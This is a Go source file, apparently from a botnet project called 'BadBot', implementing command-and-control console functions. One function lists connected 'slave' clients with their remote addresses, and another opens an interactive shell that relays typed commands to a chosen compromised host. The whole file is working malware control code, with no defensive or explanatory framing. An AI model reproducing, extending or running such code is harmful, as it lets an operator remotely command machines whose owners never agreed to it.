package commands

import (
	"BadBot/source/slave"
	"bufio"
	"fmt"
	"os"
	"strings"
	"time"
)

func shellCount(args ...string) {

	if len(args) != 1 || len(slave.Clients) == 0 {
		return
	}

	fmt.Printf("\tClient Count: %d\n", len(slave.Clients))

	for Name, Client := range slave.Clients {
		fmt.Printf("ID: %-17s | Host: [%s]\n", Name, Client.Session.RemoteAddr())
	}

}

func writeTo_Client(client slave.Client) {

	fmt.Printf("\x1b[2J\x1b[HBadBot %s Shell [Version 1.0]\nCreation By Asuri. Powered By Goland And C. Type 'exit' to leave shell\n\n", client.Name)

	var Input string

	scanner := bufio.NewScanner(os.Stdin)

	for {

		fmt.Printf("%s>", client.Name)

		if !scanner.Scan() {
			break
		}

		Input = scanner.Text()

		Input = strings.TrimSpace(Input)

		if len(Input) == 0 {
			continue
		}

		if strings.ToLower(Input) == "exit" {
			fmt.Println("\nExiting Shell...")
			break
		}

		if _, err := client.Write(Input); err != nil {
			break
		}

		time.Sleep(700 * time.Millisecond)

	}

}

func useShell(args ...string) {

	client, exist := slave.Clients[args[1]]

	if !exist {
		fmt.Printf("client: [%s] does not exist\n", args[1])
		return
	}

	// Now Start Communicating to host
	writeTo_Client(client)

}
